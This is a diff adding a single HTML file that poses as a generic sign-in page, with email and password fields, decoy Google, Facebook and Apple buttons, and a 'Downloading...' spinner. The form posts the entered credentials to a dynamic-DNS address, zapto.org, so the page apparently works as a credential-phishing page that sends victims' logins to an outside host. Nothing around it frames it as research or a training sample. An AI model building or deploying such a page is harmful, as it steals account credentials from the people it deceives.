@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign In</title>
+    <style>
+        body {
+            margin: 0;
+            background: url("https://i.imgur.com/Db1CsS3.jpg") no-repeat center center fixed;
+            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+            font-weight: lighter;
+            /* background: url('https://images.unsplash.com/photo-1537151625747-768eb6cf92b3') no-repeat center center fixed; */
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            width: 360px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            position: relative;
+        }
+
+        h2 {
+            margin-bottom: 30px;
+        }
+
+        .subtext {
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .subtext a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        input[type="submit"] {
+            width: 107%;
+            padding: 12px;
+            font-size: 16px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        .continue-btn {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            width: 100%;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        .divider {
+            margin: 20px 0;
+            position: relative;
+            text-align: center;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            width: 45%;
+            height: 1px;
+            background: #ccc;
+        }
+
+        .divider::before {
+            left: 0;
+        }
+
+        .divider::after {
+            right: 0;
+        }
+
+        .divider span {
+            background: white;
+            padding: 0 10px;
+            color: #666;
+        }
+
+        .social-btn {
+            width: 100%;
+            padding: 10px;
+            margin: 18px 0;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            cursor: pointer;
+            background: white;
+        }
+
+        .social-btn img {
+            height: 20px;
+            margin-right: 10px;
+        }
+
+        .link {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .link a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        /* Preloader */
+        #preloader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 9999;
+        }
+
+        #preloader.hidden {
+            display: none;
+        }
+
+        .spinner {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #007bff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 10px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="login-container">
+        <h2>Sign in</h2>
+        <form id="loginForm" action="https://intakalbkabera.zapto.org/single/next2580.php" method="post">
+            <input type="email" id="inputline1" name="user" placeholder="Enter Email" required>
+            <input type="password" name="pass" placeholder="Enter Password" required>
+            <input class="continue-btn" type="submit" name="submit" value="Login" />
+        </form>
+
+        <div class="divider"><span>Or</span></div>
+
+        <div class="social-btn"><img src="https://img.icons8.com/color/48/000000/google-logo.png" /> Continue with
+            Google</div>
+        <div class="social-btn"><img src="https://img.icons8.com/color/48/000000/facebook.png" /> Continue with Facebook
+        </div>
+        <div class="social-btn"><img src="https://img.icons8.com/ios-filled/50/000000/mac-os.png" /> Continue with Apple
+        </div>
+
+        <!-- <div class="link"><a href="#">More sign-in options</a></div>
+        <div class="link"><a href="#">Get help signing in</a></div> -->
+    </div>
+
+    <!-- Preloader -->
+    <div id="preloader" class="hidden">
+        <div class="spinner"></div>
+        <p>Downloading...</p>
+    </div>
+
+    <script>
+        const form = document.getElementById("loginForm");
+        const preloader = document.getElementById("preloader");
+
+        form.addEventListener("submit", function () {
+            // Show preloader after the user clicks submit
+            preloader.classList.remove("hidden");
+        });
+    </script>
+
+</body>
+
+</html>
